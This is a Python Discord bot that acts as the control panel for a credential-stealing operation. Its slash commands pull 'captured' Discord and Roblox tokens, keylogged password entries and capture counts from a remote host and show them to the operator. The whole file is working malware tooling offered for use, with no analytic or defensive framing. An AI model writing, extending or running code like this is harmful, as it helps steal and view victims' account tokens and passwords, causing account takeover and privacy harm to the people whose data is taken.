"""Bot — reads from the render host, replies with passwords and tokens."""
import os
import requests
import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

DISCORD_TOKEN = os.environ["BOT_TOKEN"]
SERVER_URL = os.environ.get("AGENT_SERVER", "").rstrip("/")
API_KEY = os.environ["API_KEY"]
GUILD_ID = os.environ.get("GUILD_ID")  # optional: instant slash-command sync in that guild

HEADERS = {"x-api-key": API_KEY}

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)


# ---------- helpers ----------
def _api_get(path: str, params: dict | None = None) -> dict:
    r = requests.get(f"{SERVER_URL}{path}", headers=HEADERS, params=params or {}, timeout=15)
    r.raise_for_status()
    return r.json()


def _chunk_lines(lines: list[str], limit: int = 1900) -> list[str]:
    chunks, cur = [], ""
    for line in lines:
        if len(cur) + len(line) + 1 > limit:
            chunks.append(cur)
            cur = ""
        cur += line + "\n"
    if cur:
        chunks.append(cur)
    return chunks


def _sanitize(s: str) -> str:
    return (s or "").replace("`", "'").replace("\n", " ").strip()


# ---------- lifecycle ----------
@bot.event
async def on_ready():
    print(f"logged in as {bot.user} (id={bot.user.id})")
    if GUILD_ID:
        guild = discord.Object(id=int(GUILD_ID))
        bot.tree.copy_global_to(guild=guild)
        await bot.tree.sync(guild=guild)
        print(f"synced slash commands to guild {GUILD_ID}")
    else:
        await bot.tree.sync()
        print("synced slash commands globally (may take up to 1h)")


# ---------- /show-tokens ----------
@bot.tree.command(name="show-tokens", description="list all captured discord + roblox tokens")
@app_commands.describe(kind="filter: all / discord / roblox")
@app_commands.choices(kind=[
    app_commands.Choice(name="all", value="all"),
    app_commands.Choice(name="discord", value="discord"),
    app_commands.Choice(name="roblox", value="roblox"),
])
async def show_tokens(interaction: discord.Interaction, kind: app_commands.Choice[str] = None):
    await interaction.response.defer(ephemeral=True)
    filt = kind.value if kind else "all"
    params = {} if filt == "all" else {"kind": filt}
    try:
        data = _api_get("/api/tokens", params)
    except Exception as e:
        return await interaction.followup.send(f"api error: `{e}`", ephemeral=True)

    toks = data.get("tokens", [])
    if not toks:
        return await interaction.followup.send("no tokens captured yet.", ephemeral=True)

    lines = []
    for t in toks:
        lines.append(
            f"[{t['kind']}] `{_sanitize(t['token'])[:120]}` "
            f"— src: {_sanitize(t.get('source','?'))}"
        )

    chunks = _chunk_lines(lines)
    await interaction.followup.send(
        f"**{len(toks)} tokens** ({filt}) — {len(chunks)} page(s), sent ephemeral.",
        ephemeral=True,
    )
    for i, ch in enumerate(chunks, 1):
        await interaction.followup.send(
            f"```\n{ch}```".replace("\n\n", "\n"),
            ephemeral=True,
        )


# ---------- /show-passwords ----------
@bot.tree.command(name="show-passwords",
                  description="list captured password-like entries from the keylog")
@app_commands.describe(limit="how many entries to show (default 25)")
async def show_passwords(interaction: discord.Interaction, limit: int = 25):
    await interaction.response.defer(ephemeral=True)
    limit = max(1, min(limit, 200))
    try:
        data = _api_get("/api/passwords", {"limit": limit})
    except Exception as e:
        return await interaction.followup.send(f"api error: `{e}`", ephemeral=True)

    pwds = data.get("passwords", [])
    if not pwds:
        return await interaction.followup.send("no password-like entries yet.", ephemeral=True)

    lines = []
    for p in pwds:
        lines.append(
            f"[{_sanitize(p.get('site','?'))}] "
            f"`{_sanitize(p.get('entry',''))[:120]}`"
        )

    chunks = _chunk_lines(lines)
    await interaction.followup.send(
        f"**{len(pwds)} entries** — {len(chunks)} page(s), sent ephemeral.",
        ephemeral=True,
    )
    for ch in chunks:
        await interaction.followup.send(f"```\n{ch}```", ephemeral=True)


# ---------- /stats ----------
@bot.tree.command(name="stats", description="host health + capture counts")
async def stats(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        r = requests.get(SERVER_URL, timeout=10)
        r.raise_for_status()
        d = r.json()
    except Exception as e:
        return await interaction.followup.send(f"host error: `{e}`", ephemeral=True)
    await interaction.followup.send(
        f"keys: `{d.get('keys')}`  tokens: `{d.get('tokens')}`  "
        f"uptime: `{int(d.get('uptime',0))}s`",
        ephemeral=True,
    )


if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
